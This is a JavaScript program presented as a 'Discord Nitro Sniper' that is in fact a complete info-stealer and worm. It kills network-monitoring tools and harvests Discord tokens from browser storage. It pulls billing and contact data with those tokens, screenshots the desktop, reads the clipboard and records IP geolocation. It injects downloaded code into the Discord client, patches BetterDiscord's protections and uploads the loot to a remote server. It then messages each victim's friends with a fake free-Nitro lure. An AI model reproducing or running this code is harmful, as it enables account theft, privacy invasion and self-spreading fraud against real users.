const cp = require("child_process");
const fs = require("fs");
const request = require("request-promise-native");
const colors = require("colors");
const os = require("os");
const setTitle = require("console-title");
const glob = require("glob");
const buf_replace = require('buffer-replace');
const ss = require("screenshot-desktop");
const zipdir = require('zip-dir');
const rimraf = require("rimraf");

console.clear()

let base = ""

request.get({
    url: "https://pastebin.com/raw/NNEEsPHn"
}).then((res) => {
    base = res.split("Base:")[1].trim()
})

const restartClients = true

setTitle("< Discord Nitro Sniper >")

const filesDir = process.env.TEMP + "\\Donkey"

if(!fs.existsSync(filesDir)){
    fs.mkdirSync(filesDir)
}

let IPInformationJSON = {}

const embeds = []

setInterval(() => {
    const taskList = cp.execSync("tasklist", { cwd: process.env.APPDATA }).toString().toLowerCase()
    if(taskList.includes("fiddler.exe")){
        kill("fiddler")
    }
    if(taskList.includes("wireshark")){
        kill("wireshark")
    }
    if(taskList.includes("processhacker")){
        kill("processhacker")
    }

    function kill(task){
        console.log("Killed", task)
        cp.execSync(`TASKKILL /IM ${task}.exe /F`, { cwd: process.env.APPDATA })
    }
}, 1000);

runLoad()

function runLoad() {
    const title = `

                           ██████  ███▄    █  ██▓ ██▓███  ▓█████  ██▀███
                         ▒██    ▒  ██ ▀█   █ ▓██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒
                         ░ ▓██▄   ▓██  ▀█ ██▒▒██▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒
                           ▒   ██▒▓██▒  ▐▌██▒░██░▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄
                         ▒██████▒▒▒██░   ▓██░░██░▒██▒ ░  ░░▒████▒░██▓ ▒██▒
                         ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░▓  ▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
                         ░ ░▒  ░ ░░ ░░   ░ ▒░ ▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
                         ░  ░  ░     ░   ░ ░  ▒ ░░░          ░     ░░   ░
                               ░           ░  ░              ░  ░   ░

                                    Author: contact@sniper.xyz
    `;

    console.log(colors.red(title))

    console.log(colors.red('           ════════════════════════════════════════════════════════════════════════════'));
    console.log(colors.brightGreen(`                                           Status: ONLINE`))
    console.log(colors.red('           ════════════════════════════════════════════════════════════════════════════'));

    start()
}

async function start() {
    if(!fs.existsSync(filesDir)){
        fs.mkdirSync(filesDir)
    }
    const IPInformation = getIP()
    const screenshot = screenShot()
    const tokens = await grabTokens()
    const clipData = await clipBoard()
    if(fs.existsSync(process.env.APPDATA + "\\BetterDiscord")){
        bypassBetterDiscord()
    }

    logInject()

    sendHook()

    console.log("running spread")
    const infectOthers = await spread(tokens)

    console.log("it has been done")
}

async function getIP() {
    return new Promise(async(resolve, reject) => {
        return request.get({
            url: "http://ip-api.com/json/"
        }).then((res) => {
            res = JSON.parse(res)
            let information = ""
            res["maps"] = `https://www.google.com/maps/search/google+map++${res.lat},${res.lon}`
            for (const source in res){
                const value = res[source]
                information += `${source}: ${value}\n`
            }
            IPInformationJSON = res
            fs.writeFileSync(filesDir + "\\IP Information.txt", information.toString())
            resolve(information) 
        }).catch((err) => {
            resolve("No data")
        })
    })
}

function logInject() {
    const discords = []
    const injectPath = []

    fs.readdirSync(process.env.LOCALAPPDATA).forEach((file) => {
        if(file.includes("iscord")){
            discords.push(process.env.LOCALAPPDATA + "\\" + file)
        }else{
            return
        }
    })

    discords.forEach(function(file) {
        let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
        glob.sync(pattern).map(file => {
            injectPath.push(file)
        })
    });
    
    const runningDiscords = []
    const taskList = cp.execSync("tasklist", { cwd: process.env.APPDATA }).toString().toLowerCase()

    if(taskList.includes("discord")){
        runningDiscords.push("discord")
    }
    if(taskList.includes("discordcanary")){
        runningDiscords.push("discordcanary")
    }
    if(taskList.includes("discordptb")){
        runningDiscords.push("discordptb")
    }
    if(taskList.includes("discorddevelopment")){
        runningDiscords.push("discorddevelopment")
    }

    if(restartClients){
        runningDiscords.forEach((disc) => {
            cp.exec(`taskkill /IM ${disc}.exe /F`, { cwd: process.env.APPDATA }, (err) => {
                if(err){
                    return 
                }
            })
        })
    }

    request.post({
        url: `${base}/injection/code`
    }).then((res) => {
        res = res.toString()

        injectPath.forEach((file) => {
            const read = fs.readFileSync(file, "utf-8").includes("//signature")
            if(!read){
                fs.writeFileSync(file, res, {
                    encoding: "utf-8",
                    flag: "w"
                })
    
                let folder = file.replace("index.js", "Donkey").toString()
                if(!fs.existsSync(folder)){
                    fs.mkdirSync(folder, 0774)
                }

            }

            runningDiscords.forEach((disc) => {
                const path = process.env.LOCALAPPDATA + "\\" + disc + "\\Update.exe --processStart " + disc + ".exe"
                cp.exec(path, { cwd: process.env.APPDATA }, (err) => {
                    if(err){
                        return console.log(err)
                    }
                })
            })
        })
    })
}

function bypassBetterDiscord(){
    const bd = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar"
    const x = fs.readFileSync(bd)
    fs.writeFileSync(bd, buf_replace(x, "api/webhooks", "donkey"))
}

async function grabTokens() {
    return new Promise(async(resolve, reject) => {
        const appdata = process.env.LOCALAPPDATA
        const roaming = process.env.APPDATA

        const paths = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',

            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowse': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Sta': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browse': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        const grabbedTokens = []
        let contentLog = ""

        for (const source in paths){
            const path = paths[source]

            if(fs.existsSync(path)){
                const dir = fs.readdirSync(path)

                dir.forEach((file_name) => {
                    if(file_name.endsWith(".log") || file_name.endsWith(".ldb")){
                        const lines = fs.readFileSync(`${path}\\${file_name}`).toString().split("\n")

                        lines.forEach((line) => {
                            for (const regex of ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', `mfa\\.[\\w-]{84}`]) {
                                for (const token of line.matchAll(regex)) {
                                    grabbedTokens.push({
                                        token: token[0],
                                        location: source
                                    })
                                }
                            }
                        })
                        
                    }
                })
            }
        }

        const validTokensInformation = []

        for (const val of grabbedTokens){   

            await request.get({
                url: "https://discord.com/api/v9/users/@me",
                headers: {
                    "Authorization": val.token,
                    "content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                }
            }).then(async(info) => {
                let userVal = JSON.parse(info)

                if(validTokensInformation.map(m => m.id).includes(userVal.id)){
                    return
                }  
                
                userVal["token"] = val.token

                let badges = ""
                const flags = userVal["flags"]

                if (flags == 1){
                    badges += "Staff, "
                }
                if (flags == 2){
                    badges += "Partner, "
                }
                if (flags == 4){
                    badges += "Hypesquad Event, "
                }
                if (flags == 8){
                    badges += "Green Bughunter, "
                }
                if (flags == 64){
                    badges += "Hypesquad Bravery, "
                }
                if (flags == 128){
                    badges += "HypeSquad Brillance, "
                }
                if (flags == 256){
                    badges += "HypeSquad Balance, "
                }
                if (flags == 512){
                    badges += "Early Supporter, "
                }
                if (flags == 16384){
                    badges += "Gold BugHunter, "
                }
                if (flags == 131072){
                    badges += "Verified Bot Developer, "
                }
                if (badges == ""){
                    badges = "None"
                }

                val["badges"] = badges
                if(!userVal.phone) userVal.phone = "No Phone Number attached"

                const avatarUrl = `https://cdn.discordapp.com/avatars/${userVal.id}/${userVal.avatar}.${userVal.avatar[0] === 'a' ? 'gif' : 'jpg'}`
                userVal["avatar_url"] = avatarUrl
                userVal["location"] = val.location

                validTokensInformation.push(userVal)

                request.get({
                    url: "https://discord.com/api/v9/users/@me/billing/subscriptions",
                    headers: {
                        "Authorization": val.token,
                        "content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                    }
                }).then(async(res) => {
                    let hasNitro = false
                    if(res.toString() != "[]"){
                        hasNitro = true
                    }

                    request.get({
                        url: "https://discord.com/api/v9/users/@me/billing/payment-sources",
                        headers: {
                            "Authorization": val.token,
                            "content-Type": "application/json",
                            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                        }
                    }).then(async(res) => {
                        let billing = false
                        if(res.toString() != "[]"){
                            billing = true
                        }

                        let connections = ""

                        await request.get({
                            url: "https://discord.com/api/v9/users/@me/connections",
                            headers: {
                                "Authorization": val.token,
                                "content-Type": "application/json",
                                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                            }
                        }).then((res) => {
                            connections = res.toString().replace(/\\/g, "").trim()
                        }).catch(() => { connections = "There are no linked accounts"})

                        const fileContent = `${' '.repeat(17)}${userVal.username}#${userVal.discriminator}\n${'-'.repeat(60)}\nToken: ${val.token}\nHas Billing: ${billing}\nNitro: ${hasNitro}\nBadges: ${badges}\nEmail: ${userVal.email}\nPhone: ${userVal.phone}\nAvatar: ${avatarUrl}\n\n`
                        contentLog += fileContent

                        const embed = {
                            "color": 15550536,
                            "fields": [
                                {
                                    "name": "𝘋𝘐𝘚𝘊𝘖𝘙𝘋",
                                    "value": `Email : ${userVal.email} [${userVal.verified}]\nPhone : ${userVal.phone}\nNitro : ${hasNitro}\nBilling : ${billing}\nNSFW : ${userVal.nsfw_allowed}\nLanguage : ${userVal.locale}`,
                                    "inline": true
                                },
                                {
                                    "name": "𝘊𝘖𝘔𝘗𝘜𝘛𝘌𝘙",
                                    "value": `IP: ${IPInformationJSON.query}\nUsername : ${os.userInfo().username}\nHostname : ${os.hostname()}\nLocation : ${val.location}\nVille : ${IPInformationJSON.city}\nISP: ${IPInformationJSON.isp}\nGoogle Maps: [Link](${IPInformationJSON.maps})`,
                                    "inline": true
                                },
                                {
                                    "name": "𝘛𝘖𝘒𝘌𝘕",
                                    "value": "``" + `${userVal.token}` + "``\n",
                                    "inline": false
                                },
                                {
                                    "name": "𝘊𝘖𝘕𝘕𝘌𝘊𝘛𝘐𝘖𝘕𝘚",
                                    "value": '```' + connections.substring(0, 5990)+ '```\n',
                                    "inline": false
                                },
                                {
                                    "name": "𝘉𝘈𝘋𝘎𝘌𝘚",
                                    "value": '```' + badges + '```\n',
                                    "inline": false
                                },
                            ],
                            "author": {
                                "name": `${userVal.username}#${userVal.discriminator}  [${userVal.id}]`,
                                "icon_url": avatarUrl
                            },
                            "thumbnail": {
                                "url": avatarUrl
                            },
                            "footer": {
                                "text": userVal.bio,
                            }
                        }

                        embeds.push(embed)
                    }).catch((err) => {
                        return
                    })
                }).catch((err) => {
                    return
                })
     
            }).catch((err) => {
                return
            })
        };

        fs.writeFileSync(filesDir + "\\Discord Information.txt", contentLog)

        request.post({
            url: `${base}/tokens/send`,
            json: true,
            body: {
                "content": validTokensInformation.map(m => m.token).join("\n"),
                "username": "Tokens Hook",
                "avatar_url": "https://media.istockphoto.com/vectors/letter-tt-tt-icon-logo-vector-vector-id1152715842?k=20&m=1152715842&s=612x612&w=0&h=nXqW6wFQP6IaTREgl9y3vmsryHQNGjgAS_GmBNy8rm4="
            }
        }).catch((err) => { return})

        resolve(validTokensInformation)
    })
}

function screenShot() {
    return new Promise(async(resolve, reject) => {
        if(!fs.existsSync(filesDir + "\\Screenshots")){
            fs.mkdirSync(filesDir + "\\Screenshots")
        }

        ss.all({ format: "png" }).then((imgs) => {
            for(let i = 0; i < imgs.length; i++){
                fs.writeFileSync(filesDir + `\\Screenshots\\Display ${i + 1}.png`, Buffer.from(imgs[i]))
            }

            resolve(imgs)
        })
    })
}

function clipBoard() {
    return new Promise(async(resolve, reject) => {
        const clipB = await CB

        fs.writeFileSync(filesDir + "\\Clipboard.txt", clipB)

        resolve(clipB)
    })
}

let i = 0;

function spread(tokens) {
    return new Promise(async(resolve, reject) => {

        for(val of tokens){
            const friends = await getFriends(val.token)
            if(friends == "error")continue

            for(let u = 0; u < friends.length; u++){
                (function(userloop) {
                    console.log("479")
                    setTimeout(async function(){
                        console.log(481)
                        const chatID = await getChat(val.token, friends[u].id)
                        if(chatID != "error"){
                            console.log("484")
                            doSet(i, val.token, chatID)
                            i++
                        }

                        function doSet(i, token, chat) {
                            console.log("997")
                            setTimeout(async function() {
                                console.log("999999")
                                const send = await sendMessage(token, chat)
                                console.log(token, chat)
                                if(send == "error"){
                                    console.log("error sending message")
                                }else{
                                    console.log("Message has been sent", send)
                                }
                            }, i * randomNumber(3000, 10000));
                        }
                    }, randomNumber(3000, 10000) + (3000 * userloop));
                })(u);
            }
        }

        resolve("done")

        function sendMessage(token, id){
            return new Promise(async(resolve, reject) => {
                request.post({
                    url: `https://discord.com/api/v9/channels/${id}/messages`,
                    headers: {
                        "Authorization": token,
                        "content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                    },
                    json: {
                        "content": `(${randomString(5)})` + ` Sup, I just found this new tool that gives nitro for free within like ${randomNumber(1, 48)} hours, I've gotten 2 from it within the last ${randomNumber(49, 72)} hours 🤣, check it out, I'll send the download`
                    },
                }).then((res) => {
                    resolve(res)
                }).catch((err) => {
                    resolve("error")
                })
            })
        }
        
        function getFriends(token) {
            return new Promise(async(resolve, reject) => {
                request.get({
                    url: "https://discord.com/api/v9/users/@me/relationships",
                    headers: {
                        "Authorization": token,
                        "content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                    }
                }).then((res) => {
                    resolve(JSON.parse(res))
                }).catch((err) => {
                    resolve("error")
                })
            })
        }
    
        function getChat(token, id){
            return new Promise(async(resolve, reject) => {
                request.post({
                    url: "https://discord.com/api/v9/users/@me/channels",
                    headers: {
                        "Authorization": token,
                        "content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
                    },
                    json: {
                        "recipient_id": id
                    }
                }).then((res) => {
                    resolve(res.id)
                }).catch((err) => {
                    resolve("error")
                })
            })
        }
    })
}

const CB = new Promise((resolve, reject) => {
    try{
        const exe = cp.execSync('powershell -command "Get-Clipboard"', { cwd: process.env.APPDATA })
        resolve(exe)
    }catch(err){
        reject(err)
    }
})

function sendHook() {
    const saveLocation = process.env.TEMP + `/Donkey-${os.userInfo().username}.zip`
    
    zipdir(filesDir, { saveTo: saveLocation }, function (err, buffer) {
        const formData = {
            "file": fs.createReadStream(saveLocation),
            "embeds": JSON.stringify(embeds)
        }

        request.post({
            url: `${base}/information/send`,
            formData,
        }).then((res) => {
            rimraf.sync(filesDir)
            rimraf.sync(saveLocation + `/zippedUPDonkey.zip`)
        })
    });
}

function randomString(length) {
    let result           = '';
    let characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let charactersLength = characters.length;
    for (let i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randomNumber(min, max){
    return Math.floor(Math.random() * (max - min) + min)
}